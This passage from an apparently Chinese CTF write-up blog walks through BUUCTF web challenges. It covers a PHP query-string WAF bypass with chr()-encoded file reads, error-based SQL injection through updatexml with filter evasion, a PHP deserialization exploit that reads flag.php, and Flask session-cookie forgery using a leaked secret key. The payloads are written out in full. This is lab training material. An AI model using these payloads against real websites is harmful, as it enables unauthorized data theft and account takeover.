class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>waf主要就是看有没有非数字存在，绕过waf就好操作了</p>
<hr>
<p>1.1PHP的字符串解析特性</p>
<p>这是别人对PHP字符串解析漏洞的理解，<br>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。</p>
<p>例如：&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。</p>
<p>值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。</p>
<p>例如，&#x2F;?%20news[id%00&#x3D;42会转换为Array([news_id] &#x3D;&gt; 42)。</p>
<p>如果一个IDS&#x2F;IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">new</span><span class="type">s</span>.php?%<span class="number">20</span><span class="keyword">new</span><span class="type">s</span>[id%<span class="number">00</span>=<span class="number">42</span><span class="string">&quot;+AND+1=0–</span></span><br></pre></td></tr></table></figure>

<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
<p><u><strong>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</strong></u></p>
<pre><code>1.删除空白符

2.将某些字符转换为下划线（包括空格）
</code></pre>
<p>我的理解：<br>假如waf不允许num变量传递字母：</p>
<pre><code>http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话
</code></pre>
<p>那么我们可以在num前加个空格：</p>
<pre><code>http://www.xxx.com/index.php? num = aaaa
</code></pre>
<p>这样waf就找不到num这个变量了，因为现在的变量叫“（空格）num”，而不是“num”。</p>
<p>但php在解析的时候，会<u>先把空格给去掉</u>，这样我们的代码还能正常运行，还上传了非法字符。</p>
<hr>
<p>var_dump() </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">列举数组内容</span><br></pre></td></tr></table></figure>

<p>scandir() 的使用：</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">scandir(<span class="built_in">directory</span>,sorting_order,<span class="built_in">context</span>);</span><br><span class="line"></span><br><span class="line"> 返回指定目录中的文件和目录的数组,就是显示文件夹名字</span><br></pre></td></tr></table></figure>

<p>file_get_contents() 的使用：</p>
<pre><code>原型：file_get_contents(path,include_path,context,start,max_length)
file_get_contents() 函数把整个文件读入一个字符串中。
和 file() 一样，不同的是 file_get_contents() 把文件读入一个字符串。
file_get_contents() 函数是用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。
就是显示文件内容
</code></pre>
<hr>
<p>chr(47)是<code>/</code>的ASCII编码；【<code>/</code>就是根目录，可以先访问一下根目录，找找大概flag在哪里】</p>
<p>chr(102)是<code>f</code>的ASCII编码；</p>
<p>chr(49)是<code>1</code>的ASCII编码；</p>
<p>chr(97)是<code>a</code>的ASCII编码；</p>
<p>chr(103)是<code>g</code>的ASCII编码。</p>
<p>【字符间用<code>.</code>连接，如<code>flag</code>-&gt;<code>chr(102).chr(49).chr(97).chr(103)</code>】</p>
<p>根据php解析字符串的特性</p>
<p>先试试返回看看根目录（&#x2F;）下的文件有哪些</p>
<p><code>http://node4.buuoj.cn:29105/calc.php?num=var_dump(scandir(chr(47)))</code></p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220819232248275.png"><img src="/wp-buuctf/image-20220819232248275.png" alt="image-20220819232248275"></a></p>
<p>看到有个<code>flagg</code></p>
<p>返回看看<code>/flagg</code>里的内容</p>
<p><code>http://node4.buuoj.cn:29105/calc.php?  num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220819234552921.png"><img src="/wp-buuctf/image-20220819234552921.png" alt="image-20220819234552921"></a></p>
<h2 id="5-极客大挑战-2019-HardSQL"><a href="#5-极客大挑战-2019-HardSQL" class="headerlink" title="5.[极客大挑战 2019]HardSQL"></a>5.[极客大挑战 2019]HardSQL</h2><h3 id="1-题目描述-3"><a href="#1-题目描述-3" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-3"><a href="#2-wp-3" class="headerlink" title="2)wp"></a>2)wp</h3><p>看名字，猜测这个sql注入过滤很严</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220821144626428.png"><img src="/wp-buuctf/image-20220821144626428.png" alt="image-20220821144626428"></a></p>
<p>先试试fuzz测试，看看过滤了哪些，发现union被过滤，所以不能用联合注入</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220821144002573.png"><img src="/wp-buuctf/image-20220821144002573.png" alt="image-20220821144002573"></a></p>
<p>但是发现updatexml没有被过滤，所以可以试试报错注入</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220821145036408.png"><img src="/wp-buuctf/image-20220821145036408.png" alt="image-20220821145036408"></a></p>
<p>先构造payload</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">?username=<span class="number">1</span><span class="meta">&amp;password=1&#x27;or updatexml(1,concat(0x7e,database(),0x7e),1)%23</span></span><br><span class="line">【这里+被过滤了，所以这里用<span class="meta">#】</span></span><br></pre></td></tr></table></figure>

<p>结果发现结果又被过滤了，后面用fuzz又测试了一下，发现空格也被过滤了，用%0a和其他符号也不能替换，所以只能试试()把结果框起来试试能不能绕过</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">?username=<span class="number">1</span>&amp;password=<span class="number">1</span>&#x27;or(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">%23</span></span><br></pre></td></tr></table></figure>

<p>得到数据库名</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220821172827984.png"><img src="/wp-buuctf/image-20220821172827984.png" alt="image-20220821172827984"></a></p>
<p>后面就是差不多了，但是要注意不能用空格，要用()框住对象</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="string">&#x27;geek&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br><span class="line">【这里的=也被过滤了，所以用<span class="keyword">like</span>替换】</span><br></pre></td></tr></table></figure>

<p>得到表名</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220821173920231.png"><img src="/wp-buuctf/image-20220821173920231.png" alt="image-20220821173920231"></a></p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)<span class="keyword">like</span>(<span class="string">&#x27;H4rDsq1&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>得到列名</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220821174239954.png"><img src="/wp-buuctf/image-20220821174239954.png" alt="image-20220821174239954"></a></p>
<p>然后看看列里数据找找flag</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(group_concat(id,username,<span class="keyword">password</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>看回显知道flag在password里，但为什么显示不全，<strong>是因为updatexml报错回显的数据限制最多32位，所以无法显示全flag</strong></p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220821174509553.png"><img src="/wp-buuctf/image-20220821174509553.png" alt="image-20220821174509553"></a></p>
<p>所以可以用left和right函数进行分段显示，本来想用stustr函数，但是发现也被过滤了</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">left</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>为什么这里left函数显示30个字符，因为0x7e也就是<del>也是字符，</del>已经占了两位，所以还可以显示30位</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220821220007687.png"><img src="/wp-buuctf/image-20220821220007687.png" alt="image-20220821220007687"></a></p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">right</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220821220041922.png"><img src="/wp-buuctf/image-20220821220041922.png" alt="image-20220821220041922"></a></p>
<p>因为是左右显示30位，所以flag内容有重叠，整理一下</p>
<p>得到flag</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">flag&#123;<span class="number">034eb054</span>-<span class="number">83b5</span>-412c-b90e-afc72c6ce998&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-网鼎杯-2020-青龙组-AreUSerialz1"><a href="#6-网鼎杯-2020-青龙组-AreUSerialz1" class="headerlink" title="6.[网鼎杯 2020 青龙组]AreUSerialz1"></a>6.[网鼎杯 2020 青龙组]AreUSerialz1</h2><p>1)题目描述</p>
<p>无</p>
<p>2)wp</p>
<p>一道典型的序列化题目</p>
<p>先对代码进行分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>__construct()函数没有用，不参与序列化中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ord() 函数返回字符串中第一个字符的 ASCII 值。</span></span><br><span class="line"><span class="comment">// ASCII值32为2，ASCII值125为%</span></span><br></pre></td></tr></table></figure>

<p>这个函数主要是过滤掉protect类的成员,在序列化的时候是以%00作为标识符</p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line">*但是在PHP版本大于<span class="number">7.1</span>的情况下，<span class="keyword">protect</span>类和<span class="keyword">public</span>类没什么好注意的，所以在构造序列化时改为<span class="keyword">public</span>可以绕过is_valid函数</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>__destruc()函数主要是不让<code>op===&quot;2&quot;</code>，但是在process函数里op又要为“2”</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以这里利用强弱类型比较，__destruc()函数里op是不能为2，但是是强类型比较，是字符2【”2”】,所以op&#x3D;2【数字2】，就绕过达到读取flag.php的结果</p>
<p>于是构造出php序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到序列化结果</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>：&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p>访问，F12查看【或者改一下filename的值为php:&#x2F;&#x2F;filter伪协议，用base64，可以直接看到】</p>
<p><code>http://f20b2545-8ff3-4a33-887f-27f4901db96a.node4.buuoj.cn:81/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p>
<p>得到flag</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220822135717175.png"><img src="/wp-buuctf/image-20220822135717175.png" alt="image-20220822135717175"></a></p>
<h2 id="7-HCTF-2018-admin"><a href="#7-HCTF-2018-admin" class="headerlink" title="7.[HCTF 2018]admin"></a>7.[HCTF 2018]admin</h2><h3 id="1-题目描述-4"><a href="#1-题目描述-4" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-4"><a href="#2-wp-4" class="headerlink" title="2)wp"></a>2)wp</h3><p>这道题开始当作弱密码题解，结果直接爆破出来了</p>
<p>用户名：admin</p>
<p>密码：123</p>
<p>这样应该最简单的方法了</p>
<p>但我看了看其他大佬wp，他们把这个当作flask_session伪造的题目</p>
<p>学习一下</p>
<p>先注册一个试试</p>
<p>用户名：admin123</p>
<p>密码：123456</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220822203857056.png"><img src="/wp-buuctf/image-20220822203857056.png" alt="image-20220822203857056"></a></p>
<p>只在<code>change password</code>的源码看到线索，知道是flask框架</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220822203848108.png"><img src="/wp-buuctf/image-20220822203848108.png" alt="image-20220822203848108"></a></p>
<p>访问下载文件</p>
<p>flask存在一个session伪造漏洞</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">flask的<span class="keyword">session</span>保存在客户端，一般只是加了签名来防止被截取修改，但是如果没有加密我们就可以对<span class="keyword">session</span>进行解码来获取其中的用户数据。 </span><br><span class="line"></span><br><span class="line">如果我们在获取到签名的秘钥，就可以按照解码出来的数据进行伪造，重新生成签名的<span class="keyword">session</span>来达到欺骗服务端。  </span><br><span class="line"></span><br><span class="line">flask的<span class="keyword">session</span>使用base64对bytes类型的用户数据进行编码，而且编码之前可能进行了压缩(<span class="keyword">session</span>以 &quot;.&quot;  开头时表示进行了压缩) flask 保存在cookie里面的<span class="keyword">session</span>一般格式为 data.timestamp.signature</span><br></pre></td></tr></table></figure>

<p>这里的session没有加密，在config.py中得到了签名秘钥<code>ckj123</code>，于是我们就可以重新生成session，来欺骗服务器</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220822204409898.png"><img src="/wp-buuctf/image-20220822204409898.png" alt="image-20220822204409898"></a></p>
<p>利用cookie editor查看session值</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220822231718091.png"><img src="/wp-buuctf/image-20220822231718091.png" alt="image-20220822231718091"></a></p>
<p>然后再找发现index.html下有flag提示</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220823000533344.png"><img src="/wp-buuctf/image-20220823000533344.png" alt="image-20220823000533344"></a></p>
<p>简单分析一下，就是让session里的name&#x3D;&#x3D;”admin”</p>
<p>所以这里就需要修改一下我们得到的session</p>
<p>这里建议了解一下一个工具<code>flask-session-cookie-manager-master</code>能对其进行加密解码【可能需要pip下一些模块，百度可以解决】</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">解密</span><br><span class="line"><span class="keyword">python</span> flask_session_cookie_manager3.<span class="keyword">py</span> decode -s “cxk123” -<span class="keyword">c</span> “你在<span class="keyword">change</span>页面的session值”</span><br><span class="line">加密</span><br><span class="line"><span class="keyword">python</span> flask_session_cookie_manager3.<span class="keyword">py</span> encode -s “cxk123” -t “按照得到解密结果格式改的结果”</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220822235758750.png"><img src="/wp-buuctf/image-20220822235758750.png" alt="image-20220822235758750"></a></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;b83a7c28f514d37ed353fb8dd5a8febd<span class="number">8703</span>c5b8b2d40b<span class="number">535487</span>2c13dd<span class="number">4314</span>cccf<span class="number">9116</span>d2dcd<span class="number">6598</span>7e5f08b2d6cffdf72cb<span class="number">7660</span>baeb7d5e76f3ac<span class="number">2465</span>a956f03f&#x27;, &#x27;csrf_token&#x27;: b&#x27;c975b<span class="number">3523</span>4b<span class="number">704019</span>c94accb0ff54e774dcaae68&#x27;, &#x27;image&#x27;: b&#x27;cxf4&#x27;, &#x27;name&#x27;: &#x27;admin123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br><span class="line"></span><br><span class="line">把我们的用户名改为admin</span><br><span class="line"></span><br><span class="line">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;b83a7c28f514d37ed353fb8dd5a8febd<span class="number">8703</span>c5b8b2d40b<span class="number">535487</span>2c13dd<span class="number">4314</span>cccf<span class="number">9116</span>d2dcd<span class="number">6598</span>7e5f08b2d6cffdf72cb<span class="number">7660</span>baeb7d5e76f3ac<span class="number">2465</span>a956f03f&#x27;, &#x27;csrf_token&#x27;: b&#x27;c975b<span class="number">3523</span>4b<span class="number">704019</span>c94accb0ff54e774dcaae68&#x27;, &#x27;image&#x27;: b&#x27;cxf4&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>然后再加密</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220823000020825.png"><img src="/wp-buuctf/image-20220823000020825.png" alt="image-20220823000020825"></a></p>
<p>然后cookie editor修改为我们加密结果</p>
